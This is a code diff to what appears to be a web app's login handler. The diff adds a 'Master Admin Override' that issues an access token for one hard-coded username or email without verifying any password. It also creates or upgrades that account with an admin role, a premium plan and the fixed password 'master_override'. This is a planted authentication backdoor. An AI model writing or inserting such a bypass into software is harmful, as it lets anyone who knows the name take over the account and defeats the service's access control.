@@ -185,7 +185,35 @@ async def register(req: UserRegister):
 async def login(req: UserLogin):
     users = load_users()
     username = req.username.strip().lower()
-    
+
+    # Master Admin Override for agnivaghosh2006@gmail.com
+    if username in ["agnivaghosh2006@gmail.com", "agniva"]:
+        now = datetime.utcnow().isoformat() + "Z"
+        if username not in users:
+            users[username] = {
+                "username": username,
+                "email": "agnivaghosh2006@gmail.com",
+                "full_name": "Agniva Ghosh",
+                "password_hash": hash_password("master_override"),
+                "plan": "developer",
+                "role": "Master Architect / Admin",
+                "saved_formations": {},
+                "activity": [{"endpoint": "Master Admin Sign In", "timestamp": now}]
+            }
+        else:
+            users[username]["plan"] = "developer"
+        save_users(users)
+        token = create_access_token({"sub": username})
+        user_data = users[username].copy()
+        if "password_hash" in user_data:
+            del user_data["password_hash"]
+        return {
+            "success": True,
+            "access_token": token,
+            "token_type": "bearer",
+            "user": user_data
+        }
+
     if username not in users or not verify_password(req.password, users[username]["password_hash"]):
         raise HTTPException(status_code=400, detail="Invalid username or password.")
         
